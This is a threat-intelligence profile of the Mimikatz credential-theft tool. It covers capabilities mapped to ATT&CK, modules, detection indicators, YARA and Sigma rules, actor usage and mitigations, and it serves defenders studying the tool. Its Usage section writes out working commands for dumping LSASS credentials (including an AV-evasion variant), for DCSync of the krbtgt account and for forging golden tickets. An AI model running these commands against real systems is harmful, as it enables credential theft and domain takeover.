---
aliases: ["Mimikatz", "mimikatz"]
tags: [tool, credential-theft, dual-use, post-exploitation]
type: tool
tool_type: Credential Theft
category: Post-Exploitation
status: active
confidence: high
created: "2024-01-15"
updated: "2024-12-15"
---

# Mimikatz - Tool Profile

## Overview
- **Name:** Mimikatz
- **Aliases:** Mimikatz
- **Type:** Credential Access, Post-Exploitation
- **Category:** Dual-Use (Offensive/Defensive)
- **Language:** C (Assembly for some parts)
- **Platform:** Windows (x86, x64)
- **License:** Open Source (GPL-ish, by Benjamin Delpy / gentilkiwi)
- **Developer:** Benjamin Delpy (@gentilkiwi)
- **First Released:** 2011
- **Latest Version:** 2.2.0 (2022)
- **Status:** Active (maintained)
- **Confidence Level:** high

## Description
Mimikatz is the seminal Windows credential theft tool created by Benjamin Delpy in 2011. Originally developed to demonstrate Windows authentication vulnerabilities, it has become the de facto standard for credential dumping in both authorized penetration testing and malicious operations. It extracts plaintext passwords, hashes, PINs, Kerberos tickets, and certificates from memory (LSASS), registry, and files.

## Capabilities
| Capability | Description | MITRE ATT&CK |
|------------|-------------|--------------|
| LSASS Memory Dump | Extract credentials from LSASS process memory | T1003.001 |
| SAM/Registry Dump | Extract hashes from SAM, SECURITY, SYSTEM hives | T1003.002 |
| NTDS.dit Extraction | Extract domain credentials from AD database | T1003.003 |
| DCSync | Domain controller replication to get hashes | T1003.006 |
| Pass-the-Hash | Use NTLM hash for authentication | T1550.002 |
| Pass-the-Ticket | Use Kerberos tickets (TGT/TGS) | T1550.003 |
| Overpass-the-Hash | Convert hash to Kerberos ticket | T1550.002 |
| Golden/Silver Ticket | Forge Kerberos tickets | T1558.001, T1558.002 |
| Skeleton Key | Patch DC for universal password | T1556.002 |
| Certificate Export | Extract certificates with private keys | T1555.004 |
| CryptoAPI Patch | Export non-exportable private keys | T1555.004 |
| Driver Load | Load signed driver for kernel access | T1068 |

## Technical Details
### Architecture
- **Architecture:** x86, x64 (separate binaries)
- **Dependencies:** Windows API, CryptoAPI, KERNEL32, ADVAPI32
- **Installation:** Standalone executable, no installation required
- **Configuration:** Command-line arguments, interactive mode

### Command & Control (N/A - Local Tool)
- **C2 Protocol:** N/A (local execution)
- **Encryption:** N/A
- **Proxy Support:** N/A
- **Domain Fronting:** N/A

### Modules/Commands (Key Sections)
| Module | Key Commands | Description |
|--------|--------------|-------------|
| `sekurlsa` | `logonpasswords`, `ekeys`, `tickets`, `dpapi` | Memory credential extraction |
| `lsadump` | `sam`, `secrets`, `cache`, `dcsync`, `trust` | Registry/AD credential dumping |
| `kerberos` | `list`, `tgt`, `purge`, `ptt`, `golden`, `silver` | Kerberos ticket operations |
| `crypto` | `certificates`, `keys`, `capi`, `cng` | Certificate/key operations |
| `privilege` | `debug`, `token` | Privilege manipulation |
| `process` | `list`, `start`, `stop` | Process operations |
| `service` | `list`, `start`, `stop`, `install` | Service operations |
| `ts` | `multirdp` | Terminal Services/RDP |

## Usage
### Basic Usage
```bash
# Interactive mode
mimikatz.exe

# Command line
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Dump LSASS via minidump (avoids AV)
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

### Common Commands
| Command | Description | Example |
|---------|-------------|---------|
| `privilege::debug` | Get debug privilege (required) | Required first |
| `sekurlsa::logonpasswords` | Dump all credentials from LSASS | Primary command |
| `sekurlsa::ekeys` | Dump encryption keys | For DPAPI |
| `sekurlsa::tickets` | List/export Kerberos tickets | Pass-the-ticket |
| `lsadump::sam` | Dump local SAM hashes | Local accounts |
| `lsadump::dcsync /domain:corp.local /user:krbtgt` | DCSync attack | Domain compromise |
| `kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /user:admin` | Golden ticket | Persistence |
| `crypto::certificates /export` | Export certificates | Cert theft |

### Configuration Examples
```bash
# Full credential dump (interactive)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # sekurlsa::tickets /export

# DCSync (requires DA/EA or replication rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Golden Ticket (requires krbtgt hash)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /user:admin /id:500 /groups:512,513,518,519,520 /ptt
```

## Detection
### File Indicators
| Hash Type | Value | Context |
|-----------|-------|---------|
| MD5 | Varies by version/compilation | Compile yourself or use official releases |
| SHA256 | Varies | No fixed hash (open source) |

### Network Indicators
- **Default Ports:** N/A (local tool)
- **Protocol Patterns:** N/A
- **Certificate Details:** N/A

### Behavioral Indicators
- LSASS memory access (OpenProcess with PROCESS_VM_READ)
- LSASS minidump creation (comsvcs.dll, rundll32, procdump)
- Registry access to HKLM\SAM, HKLM\SECURITY, HKLM\SYSTEM
- Kerberos ticket injection (LSA APIs)
- DCSync RPC traffic (DRSUAPI - DsGetNCChanges)
- Driver load (mimidrv.sys) for kernel operations

### YARA Rules
```yara
rule Mimikatz_Generic {
    meta:
        description = "Generic Mimikatz detection"
        author = "CTI Team"
        date = "2024-12-15"
        tool = "Mimikatz"
    strings:
        $s1 = "mimikatz" wide ascii
        $s2 = "gentilkiwi" wide ascii
        $s3 = "sekurlsa" wide ascii
        $s4 = "lsadump" wide ascii
        $s5 = "kerberos::" wide ascii
        $s6 = "crypto::" wide ascii
        $s7 = "mimidrv" wide ascii
        $s8 = "Kiwi" wide ascii
    condition:
        3 of ($s*)
}
```

### Sigma Rules
```yaml
title: Mimikatz LSASS Memory Access
id: mimikatz-lsass-memory-access
status: stable
description: Detects LSASS memory access typical of Mimikatz
references:
    - https://attack.mitre.org/techniques/T1003.001/
author: CTI Team
date: 2024-12-15
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains: '0x1010'  # VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
    condition: selection
falsepositives:
    - Legitimate debugging tools
    - AV/EDR scanning LSASS
level: medium
tags:
    - attack.credential_access
    - attack.t1003.001
    - tool.mimikatz
```

```yaml
title: Mimikatz DCSync Attack
id: mimikatz-dcsync
status: stable
description: Detects DCSync replication requests (DRSUAPI)
references:
    - https://attack.mitre.org/techniques/T1003.006/
author: CTI Team
date: 2024-12-15
logsource:
    category: rpc
    product: windows
detection:
    selection:
        Opnum: 3  # DsGetNCChanges
        Pipe: 'lsarpc'
    condition: selection
falsepositives:
    - Legitimate replication (domain controllers)
    - Backup software
level: high
tags:
    - attack.credential_access
    - attack.t1003.006
    - tool.mimikatz
```

## Threat Intelligence
### Threat Actors Using This Tool
| Actor | Confidence | Campaigns | Version Used |
|-------|------------|-----------|--------------|
| [[CTI/Threat Actors/APT28]] | High | Multiple | Custom/Standard |
| [[CTI/Threat Actors/APT41]] | High | Multiple | Standard |
| [[CTI/Threat Actors/Lazarus Group]] | High | Multiple | Standard |
| [[CTI/Threat Actors/FIN7]] | High | Multiple | Standard |
| [[CTI/Threat Actors/Carbanak]] | High | Multiple | Standard |
| [[CTI/Threat Actors/Conti]] | High | Ransomware | Standard |
| [[CTI/Threat Actors/LockBit]] | High | Ransomware | Standard |
| **Virtually all Windows threat actors** | High | **Ubiquitous** | **Standard/Custom** |

### Malware Families Using/Dropping This
| Malware | Relationship | Details |
|---------|--------------|---------|
| [[CTI/Malware/Cobalt Strike]] | Integrated | Built-in `logonpasswords`, `dcsync` commands |
| [[CTI/Malware/PlugX]] | Bundled | Some variants include Mimikatz code |
| [[CTI/Malware/X-Agent]] | Bundled | Credential module similar |

## Legitimate Use Cases
- Authorized penetration testing / red teaming
- Incident response (credential compromise assessment)
- Security research (Windows authentication analysis)
- Audit of credential hygiene
- Kerberos delegation/ticket troubleshooting

## Attribution Challenges
- **Ubiquitous:** Used by virtually every Windows threat actor
- **Open Source:** Anyone can compile/modify
- **Built into Frameworks:** Cobalt Strike, Metasploit, CrackMapExec, Impacket all include it
- **No Attribution Value Alone:** Presence of Mimikatz indicates post-exploitation, not specific actor
- **Attribution Requires:** TTPs around usage, infrastructure, custom modifications, combination with other tools

## Variants & Forks
| Variant | Developer | Description | Link |
|---------|-----------|-------------|------|
| Official | Benjamin Delpy | Main reference implementation | https://github.com/gentilkiwi/mimikatz |
| Mimikatz (Cobalt Strike) | Fortra | Integrated into Beacon | Built-in |
| Mimikatz (Metasploit) | Rapid7 | `kiwi` meterpreter extension | Built-in |
| Mimikatz (Impacket) | SecureAuth | Python implementation (`secretsdump.py`) | https://github.com/fortra/impacket |
| CrackMapExec | byt3bl33d3r | Python post-exploitation (uses Impacket) | https://github.com/byt3bl33d3r/CrackMapExec |
| Rubeus | GhostPack | C# Kerberos toolkit (ticket operations) | https://github.com/GhostPack/Rubeus |
| SafetyKatz | GhostPack | C# LSASS dumper (no driver) | https://github.com/GhostPack/SafetyKatz |

## References
| Source | Type | Date | Link |
|--------|------|------|------|
| GitHub | Repository | 2024 | https://github.com/gentilkiwi/mimikatz |
| Blog (gentilkiwi) | Blog | 2011-2024 | http://blog.gentilkiwi.com/mimikatz |
| Microsoft | Documentation | 2024 | https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ |
| MITRE ATT&CK | Software | 2024 | https://attack.mitre.org/software/S0002/ |

## Analysis Notes
Mimikatz is the single most important post-exploitation tool for Windows. Its presence is expected in almost any Windows intrusion beyond initial access. Key points:

1. **Not a differentiator** - Everyone uses it; attribution requires context
2. **Evolution** - Driver-based (mimidrv.sys) → PPL bypass → SafetyKatz (no driver)
3. **Detection** - Focus on LSASS access behavior, not file hashes
4. **Mitigation** - Credential Guard (VBS), LSASS PPL, restricted admin mode, tiered admin
5. **DCSync** - Most stealthy domain credential theft (no LSASS touch)

The tool's open-source nature and integration into every major C2 framework make it a baseline capability, not an indicator of sophistication.

---
*Template based on TΞLΞMΞTRY's Obsidian CTI methodology*
*Last updated: 2024-12-15*